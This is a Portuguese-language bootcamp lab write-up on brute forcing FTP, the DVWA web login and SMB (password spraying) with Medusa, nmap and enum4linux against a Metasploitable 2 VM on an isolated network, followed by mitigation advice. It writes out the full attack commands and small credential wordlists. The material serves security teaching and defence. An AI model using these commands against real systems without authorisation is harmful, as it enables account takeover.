# 🛡️ Criando um Ataque Brute Force de senhas com Medusa e Kali Linux

> **Projeto Prático – Bootcamp Santander - Cibersegurança do Zero a prática (DIO)**  
> Documentação técnica de testes controlados de força bruta, *password spraying* e enumeração de serviços realizados em ambiente virtualizado isolado, acompanhada de recomendações de mitigação (Blue Team).

---

## 📋 Índice

1. [Aviso Legal e Ético](#1-aviso-legal-e-ético)
2. [Arquitetura e Topologia do Laboratório](#2-arquitetura-e-topologia-do-laboratório)
3. [Reconhecimento e Enumeração Inicial](#3-reconhecimento-e-enumeração-inicial)
4. [Preparação das Wordlists](#4-preparação-das-wordlists)
5. [Cenário 1: Força Bruta no Serviço FTP](#5-cenário-1-força-bruta-no-serviço-ftp)
6. [Cenário 2: Automação de Login em Formulário Web (DVWA)](#6-cenário-2-automação-de-login-em-formulário-web-dvwa)
7. [Cenário 3: Enumeração SMB e Password Spraying](#7-cenário-3-enumeração-smb-e-password-spraying)
8. [Medidas de Mitigação e Hardening](#8-medidas-de-mitigação-e-hardening)
9. [Conclusão e Aprendizados](#9-conclusão-e-aprendizados)

---

## 1. Aviso Legal e Ético

Todos os testes, comandos e técnicas documentados neste repositório foram executados **exclusivamente em ambiente de laboratório local e isolado**, utilizando máquinas virtuais intencionalmente vulneráveis para fins educacionais. A execução dessas técnicas contra sistemas de terceiros sem autorização prévia e formal é ilegal.

---

## 2. Arquitetura e Topologia do Laboratório

O ambiente foi estruturado no **Oracle VirtualBox** utilizando uma rede privada isolada (**Host-Only Adapter**), garantindo que nenhum tráfego de ataque alcance redes externas.

| Máquina Virtual | Sistema Operacional | Papel no Laboratório | Endereço IP (Exemplo) | Adaptador de Rede |
| :--- | :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux | Estação de auditoria e execução do Medusa | `192.168.56.102` | Host-Only (`vboxnet0`) |
| **Alvo** | Metasploitable 2 | Servidor intencionalmente vulnerável (FTP, Web/DVWA, SMB) | `192.168.56.103` | Host-Only (`vboxnet0`) |

*(Substitua os endereços IP da tabela acima pelos IPs exibidos no comando `ip a` / `ifconfig` das suas VMs).*

### Validação de Conectividade
```bash
ping -c 4 192.168.56.103    
```

---

## 3. Reconhecimento e Enumeração Inicial

Antes de iniciar os testes de autenticação, foi realizada uma varredura de portas e serviços ativos no alvo utilizando o Nmap para confirmar a disponibilidade dos vetores:   

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.103
```
Principais serviços identificados:
Porta 21/TCP: vsftpd 2.3.4 (FTP)
Porta 22/TCP: (SSH)
Porta 80/TCP: Apache httpd 2.2.8 (Hospedando o DVWA)
Portas 139 e 445/TCP: Samba smbd 3.X - 4.X (SMB)

---

## 4. Preparação das Wordlists

Para simular cenários realistas de auditoria controlada sem gerar sobrecarga desnecessária no ambiente, foram criadas listas personalizadas enxutas na pasta /wordlists contendo usuários e senhas comuns misturados às credenciais do ambiente de teste.   

wordlists - users.txt
user\msfadmin\nadmin\root

wordlists - pass.txt
123456\password\qwerty\msfadmin

---

## 5. Cenário 1: Força Bruta no Serviço FTP

Neste cenário, o objetivo foi testar múltiplas combinações de usuários e senhas simultaneamente contra o daemon FTP utilizando o módulo ftp do Medusa.   

Comando Executado
```Bash
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6
```
-h: IP do host alvo.
-U: Arquivo contendo a lista de usuários.
-P: Arquivo contendo a lista de senhas.
-M ftp: Módulo correspondente ao protocolo FTP.
-t 6: Número de threads simultâneas.

Validação do Acesso
Após o Medusa identificar o par de credenciais válido (ACCOUNT FOUND), o acesso foi confirmado via cliente FTP nativo:
```Bash
ftp 192.168.56.103
# Inserir usuário e senha encontrados
```
---

## 6. Cenário 2: Automação de Login em Formulário Web (DVWA)

Para simular ataques contra aplicações web, foi utilizada a aplicação DVWA (Damn Vulnerable Web Application) hospedada no Metasploitable 2 (http://192.168.56.103/dvwa).

```Bash
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M http \
-m PAGE:"/dvwa/login.php" \
-m FORM:"username=^USER^&password=^PASS^&Login=Login" \
-m 'FAIL=Login failed' -t 6 
```
---

## 7. Cenário 3: Enumeração SMB e Password Spraying

Diferente da força bruta tradicional (que testa várias senhas em um único usuário e costuma gerar bloqueios de conta), o Password Spraying testa uma única senha comum contra uma lista de vários usuários válidos.   

Etapa 1: Enumeração de Usuários via SMB
Utilizando o enum4linux para listar contas locais expostas pelo serviço Samba sem autenticação prévia:
```Bash
enum4linux -a 192.168.56.103 | tee enum4_output.txt 
```
Os usuários válidos extraídos (ex: msfadmin, user, nservice) foram salvos em smb_users.txt. E as senhas usadas foram salvas no arquivo senhas_spray.txt

Etapa 2: Execução do Password Spraying com Medusa
Testando as senhas contra a lista de usuários válidos no módulo smbnt:   
```Bash
medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```
Etapa 3: Validação do Acesso via smbclient
Com a credencial validada, listamos os compartilhamentos disponíveis no servidor:   
```Bash
smbclient -L //192.168.56.103 -U msfadmin
```

---

## 8. Medidas de Mitigação e Hardening

A partir das vulnerabilidades exploradas no laboratório, as seguintes contramedidas devem ser aplicadas em ambientes corporativos para neutralizar esses vetores:

• Implementar política de senhas fortes (comprimento mínimo, complexidade e bloqueio de senhas vazadas).
• Habilitar MFA (Autenticação Multifator) sempre que possível.
• Aplicar Account Lockout Policy (bloqueio temporário após $N$ falhas).
• Substituir o FTP tradicional por SFTP (SSH File Transfer Protocol) ou FTPS.
• Configurar o Fail2Ban para banir via firewall (iptables/nftables) IPs com múltiplas falhas de login.
• Implementar Rate Limiting no servidor web/WAF (ex: Nginx limit_req).
• Adicionar CAPTCHA progressivo após falhas consecutivas.
• Utilizar tokens anti-CSRF e atrasos progressivos (progressive delays) na resposta de erro.
• Desativar o protocolo legado SMBv1 e restringir sessões nulas (Null Sessions / restrict anonymous = 2 no Samba).
• Bloquear portas SMB no perímetro externo e segmentar o acesso via VLAN/ACL.

---

## 9. Conclusão e Aprendizados

A realização deste laboratório permitiu compreender na prática como ferramentas automatizadas como o Medusa exploram falhas de configuração e credenciais fracas em diferentes protocolos de rede. Ficou evidente que a combinação entre enumeração prévia (como no SMB) e ataques direcionados aumenta drasticamente a eficiência da auditoria, reforçando a importância de camadas defensivas como monitoramento de logs, restrição de enumeração anônima e controle de tentativas de autenticação.

